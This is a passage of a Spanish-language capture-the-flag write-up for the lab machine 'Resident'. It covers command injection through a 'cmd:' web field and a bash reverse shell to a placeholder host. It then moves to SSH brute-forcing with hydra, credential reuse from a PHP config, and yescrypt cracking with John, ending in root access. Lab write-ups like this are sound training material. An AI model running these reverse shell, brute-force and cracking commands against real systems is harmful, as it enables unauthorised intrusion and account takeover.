Como bien vimos en el código del dashboard, si al campo de envío de texto le damos la palabra clave **cmd:**, nos deja ejecutar cualquier comando:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura20.png">
</p>

Vamos a capturar esa petición con **BurpSuite** y la mandamos al **Repeater**:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura21.png">
</p>

Ahí vemos en la data el parámetro **user_message** que es el que ejecuta el comando después de la palabra clave **cmd:**.

No tenemos ninguna restricción para la ejecución de comandos, por lo que podemos mandarnos una **Reverse Shell** de una vez.

Abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Usemos la siguiente **Reverse Shell**:
```bash
bash -c 'bash >& /dev/tcp/Tu_IP/443 0>&1'
```

**URL encodea** el comando y luego, manda la petición:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura22.png">
</p>

Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...

connect to [Tu_IP] from (UNKNOWN) [192.168.100.110] 38200
whoami
www-data
```

Ya solo nos faltaría obtener una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
www-data@TheHackersLabs-Resident:/var/www/html$ whoami
www-data
```

### Aplicando Fuerza Bruta al Servicio SSH {#FuerzaBruta}

Si recordamos, logramos identificar un usuario cuando aplicamos el **SSRF + LFI**.

Vamos a usar ese usuario para aplicarle Fuerza Bruta al **servicio SSH** con la herramienta **hydra**:
```bash
hydra -l 'ram' -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.110 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-17 14:27:03
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.100.110:22/
[22][ssh] host: 192.168.100.110   login: ram   password: *******
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 21 final worker threads did not complete until end.
[ERROR] 21 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-17 14:27:08
```
Tenemos la contraseña y es bastante simple.

Probémosla:
```bash
ssh ram@192.168.100.110
ram@192.168.100.110's password: 
Linux TheHackersLabs-Resident 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
...
ram@TheHackersLabs-Resident:~$ whoami
ram
```
Estamos dentro como el **usuario ram**.

Podríamos avanzar por aquí, pero sería adelantarnos demasiado y dejar las cosillas que tiene preparadas esta máquina para nosotros.

Así que seguiremos en nuestra sesión de la **Reverse Shell**.

## Post Explotación {#Post}

### Enumeración de Servicio MariaDB y Ganando Acceso como Usuario simple {#MariaDB}

Si revisamos los archivos del servidor web, veremos uno que identificamos en el **Fuzzing**, que es el archivo **connect.php**:
```bash
www-data@TheHackersLabs-Resident:/var/www/html$ ls
50.jpg	composer.json  composer.lock  connect.php  dashboard.php  identities.xml  index.php  info.php  logout.php  robots.txt
```

Si lo leemos, encontraremos las credenciales de acceso para conectarnos a una base de datos de **MySQL**:
```bash
www-data@TheHackersLabs-Resident:/var/www/html$ cat connect.php 
<?php
$servername = "localhost";
$username = "simple";
$password = "simple";
$dbname = "login";

// Crear conexión
$conn = new mysqli($servername, $username, $password, $dbname);

// Verificar conexión
if ($conn->connect_error) {
    die("Error de conexión: " . $conn->connect_error);
}
?>
```

Revisamos que este activo este servicio con el comando **ss**:
```bash
www-data@TheHackersLabs-Resident:/var/www/html$ ss -tuln | grep tcp
tcp   LISTEN 0      128                             127.0.0.1:631        0.0.0.0:*          
tcp   LISTEN 0      128                               0.0.0.0:22         0.0.0.0:*          
tcp   LISTEN 0      80                              127.0.0.1:3306       0.0.0.0:*          
tcp   LISTEN 0      511                                     *:80               *:*          
tcp   LISTEN 0      128                                  [::]:22            [::]:*          
tcp   LISTEN 0      128                                 [::1]:631           [::]:*
```
Ahí está.

Conectémonos a ese servicio:
```bash
www-data@TheHackersLabs-Resident:/var/www/html$ mysql -h localhost -u simple -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
...
MariaDB [(none)]>
```
Resultó ser el **servicio MariaDB**.

Aquí debe de existir la base de datos **login**:
```bash
MariaDB [(none)]> show databases;
+--------------------+

| Database           |
+--------------------+

| information_schema |
| login              |
+--------------------+
2 rows in set (0.001 sec)
```
Sí existe.

Usemos esa BD y veamos sus tablas:
```bash
MariaDB [(none)]> use login;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [login]> show tables;
+-----------------+

| Tables_in_login |
+-----------------+

| credentials     |
+-----------------+
1 row in set (0.000 sec)
```
Solo hay una tabla.

Veamos su contenido:
```bash
MariaDB [login]> select * from credentials;
+----+----------+----------------------------------+

| id | username | password                         |
+----+----------+----------------------------------+

|  2 | admin    | 5a06153b12b2ec6210a8bb66f4e78c4* |
+----+----------+----------------------------------+
1 row in set (0.000 sec)
```
Es el mismo Hash que logramos identificar para ganar acceso al login.

Esto no nos sirve de mucho, porque es algo que ya descubrimos.

Pero si revisamos el `/etc/passwd`, veremos los usuarios de la máquina:
```bash
www-data@TheHackersLabs-Resident:/var/www/html$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
simple:x:1000:1000:simple,,,:/home/simple:/bin/bash
ram:x:1001:1001::/home/ram:/bin/bash
```
Ahí está el **usuario simple**.

Quizá usó la misma contraseña para su usuario de la máquina.

Comprobémoslo:
```bash
www-data@TheHackersLabs-Resident:/var/www/html$ su simple
Password: 
simple@TheHackersLabs-Resident:/var/www/html$ whoami
simple
```
Muy bien, ahora somos el **usuario simple**.

En el directorio `/home` debe estar el directorio de este usuario:
```bash
simple@TheHackersLabs-Resident:/var/www/html$ ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Oct  7  2024 .
drwxr-xr-x 19 root   root   4096 Oct  4  2024 ..
drwxr-xr-x  5 ram    ram    4096 Sep 16 19:04 ram
drwx------ 15 simple simple 4096 Oct  7  2024 simple
```

Entremos y veamos su contenido:
```bash
simple@TheHackersLabs-Resident:/var/www/html$ cd /home/simple/
simple@TheHackersLabs-Resident:~$ ls
cp.sh  Descargas  Documentos  Escritorio  Imágenes  Música  Plantillas  Público  Vídeos
```
Pensé que aquí estaría la flag, pero aquí hay un script interesante.

Podríamos ir a revisar el directorio del **usuario ram**, pero nos adelantaríamos, así que no nos movamos de aquí.

### Crackeo de Hash Yescrypt para Convertirnos en Usuario ram y Encontrando Contraseña de Root {#Cracking}

Leamos el contenido de ese script:
```bash
simple@TheHackersLabs-Resident:~$ cat cp.sh 
#!/bin/bash
echo "Copiando archivo..."

/bin/cp /home/ram/password.txt /tmp/password.txt
echo "Archivo copiado a /tmp/passwd.txt"
```
Está copiando un archivo llamado **password.txt** del directorio del **usuario ram** al directorio `/tmp`, usando el mismo nombre.

Démosle permisos de ejecución, ejecutemos el script y leamos ese archivo llamado **password.txt**:
```bash
simple@TheHackersLabs-Resident:~$ chmod +x cp.sh 
simple@TheHackersLabs-Resident:~$ ./cp.sh 
Copiando archivo...
Archivo copiado a /tmp/passwd.txt
simple@TheHackersLabs-Resident:~$ cat /tmp/password.txt 
ram:$y$j9T$v3fiA7W1LOJmdyVZGUfIp0$TF7qqhsJ1SnWH8caDijOlxCjIo2VXgurTgq6DIlxmE1:20003:0:99999:7:::
```
Obtuvimos un Hash, pero no logro identificar qué tipo de Hash es con la herramienta **hash-identifier**.

Para estos casos, podemos usar la página **Hashes.com** que sirve para identificar que tipo Hash encontraste:
* <a href="https://hashes.com/en/tools/hash_identifier" target="_blank">Hash.com</a>

Copia y pega el Hash en esta página y veamos si lo puede identificar:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura23.png">
</p>

Existe el **formato crypt** en la herramienta **JhonTheRipper** que permite crackear este tipo de Hash.

Probémoslo:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash --format=crypt
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
******          (ram)     
1g 0:00:00:00 DONE (2025-09-17 03:17) 2.564g/s 246.1p/s 246.1c/s 246.1C/s 123456..yellow
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Tenemos la contraseña del **usuario ram**.

Vamos a comprobar que funciona:
```bash
simple@TheHackersLabs-Resident:~$ su ram
Contraseña: 
ram@TheHackersLabs-Resident:/home/simple$ whoami
ram
```
Muy bien, ya somos **ram**.

En su directorio encontraremos la flag del usuario:
```bash
ram@TheHackersLabs-Resident:/home/simple$ cd ../ram/
ram@TheHackersLabs-Resident:~$ ls
password.txt  root.txt  user.txt
ram@TheHackersLabs-Resident:~$ cat user.txt
...
```

Curiosamente, también encontraremos un archivo que contiene una contraseña:
```bash
ram@TheHackersLabs-Resident:~$ cat root.txt
...
```
Quizá de verdad sea la contraseña del **Root**.

Vamos a probarla:
```bash
ram@TheHackersLabs-Resident:~$ su root
Contraseña: 
root@TheHackersLabs-Resident:/home/ram# whoami
root
```
Excelente, ya somos **Root**.

Obtengamos la última flag:
```bash
root@TheHackersLabs-Resident:/home/ram# cd /root
root@TheHackersLabs-Resident:~# ls
root.txt
root@TheHackersLabs-Resident:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
